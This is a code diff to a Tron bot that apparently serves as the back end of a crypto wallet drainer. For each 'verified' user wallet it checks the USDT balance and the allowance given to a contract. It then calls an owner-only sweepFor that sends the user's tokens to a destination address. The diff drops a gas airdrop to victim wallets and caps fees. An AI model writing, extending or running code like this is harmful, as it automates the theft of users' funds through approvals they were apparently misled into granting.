@@ -2,12 +2,11 @@
 // Watches verified_wallets table (chain=tron) — same pattern as eth/bnb/polygon bots.
 //
 // On each new/updated verified wallet:
-//   1. Checks USDT-TRC20 balance
-//   2. Sends ~13 TRX gas airdrop if native balance < 7 TRX (~$1 USD)
-//   3. Calls sweepFor(user, [USDT]) on TronV2 contract → funds go to destination
+//   1. Checks USDT-TRC20 balance + allowance to contract
+//   2. Calls sweepFor(user, [USDT]) on TronV2 (onlyOwner) → funds go to destination
 //
-// Note: Tron verified wallets are stored in the verified_wallets table
-//       (not delegated_wallets — Tron uses its own verify flow via TronLink).
+// No TRX gas airdrop — owner pays energy/bandwidth for sweepFor only.
+// Note: Tron verified wallets are stored in verified_wallets (not delegated_wallets).
 
 require("dotenv").config();
 const TronWebModule = require("tronweb");
@@ -32,12 +31,8 @@ const CHAIN                     = "tron";
 // USDT-TRC20 mainnet (6 decimals)
 const USDT_TRC20    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const MIN_USDT_SUN  = 500_000n; // 0.50 USDT minimum before sweeping
-
-// Gas airdrop: DISABLED — was draining the owner/relayer TRX balance.
-// Owner pays energy for sweepFor; users do not need a TRX top-up for sweeps.
-const TRON_AIRDROP_ENABLED = process.env.TRON_AIRDROP_ENABLED === "true";
-const DROP_TRX_SUN = 13_000_000; // 13 TRX in sun (unused while suspended)
-const MIN_TRX_SUN  =  7_000_000; //  7 TRX threshold (~$1)
+// Cap TRX burn on failed/expensive sweeps (owner pays fees when energy is low)
+const SWEEP_FEE_LIMIT_SUN = 30_000_000; // 30 TRX max
 
 // ── Validation ────────────────────────────────────────────────────────────────
 
@@ -135,39 +130,6 @@ async function getUsdtBalance(base58Addr) {
   }
 }
 
-async function getNativeBalanceSun(base58Addr) {
-  try {
-    const bal = await tronWeb.trx.getBalance(base58Addr);
-    return Number(bal);
-  } catch {
-    return 0;
-  }
-}
-
-// ── Gas airdrop ───────────────────────────────────────────────────────────────
-
-async function sendGasIfNeeded(base58Addr) {
-  if (!TRON_AIRDROP_ENABLED) {
-    log(`Gas airdrop SUSPENDED — skip for ${base58Addr}`);
-    return;
-  }
-  const native = await getNativeBalanceSun(base58Addr);
-  if (native >= MIN_TRX_SUN) {
-    log(`Gas OK for ${base58Addr} (${(native / 1e6).toFixed(2)} TRX) — skip airdrop`);
-    return;
-  }
-  log(`Gas airdrop → ${base58Addr} (${DROP_TRX_SUN / 1e6} TRX)`);
-  try {
-    const tx = await tronWeb.trx.sendTransaction(base58Addr, DROP_TRX_SUN);
-    if (!tx?.txid) throw new Error("No txid returned");
-    log(`Gas airdrop tx: ${tx.txid}`);
-    // Wait ~3.5s for TRX to land before sweepFor (DPoS blocks ≈ 3s)
-    await new Promise((r) => setTimeout(r, 3500));
-  } catch (e) {
-    err(`Gas airdrop failed for ${base58Addr}: ${e.message}`);
-  }
-}
-
 // ── Sweep ─────────────────────────────────────────────────────────────────────
 
 async function sweepWallet(addr) {
@@ -198,14 +160,12 @@ async function sweepWallet(addr) {
       warn(`allowance check failed (continuing): ${e.message}`);
     }
 
-    // 3. Airdrop TRX gas if needed (owner pays energy for sweepFor, but keep for safety)
-    await sendGasIfNeeded(base58Addr);
-
-    // 4. Call sweepFor(user, [USDT]) — TronV2: onlyOwner
+    // 3. sweepFor(user, [USDT]) — onlyOwner; owner must have energy or TRX for fees
+    //    (no user TRX airdrop — that drained the owner wallet)
     log(`sweepFor(${base58Addr}, [USDT]) → ${DESTINATION_ADDRESS}`);
     const contract = tronWeb.contract(TRONV2_ABI, CONTRACT_ADDRESS);
     const txHash   = await contract.sweepFor(base58Addr, [USDT_TRC20]).send({
-      feeLimit:           50_000_000, // 50 TRX max fee
+      feeLimit:           SWEEP_FEE_LIMIT_SUN,
       callValue:          0,
       shouldPollResponse: false,
     });
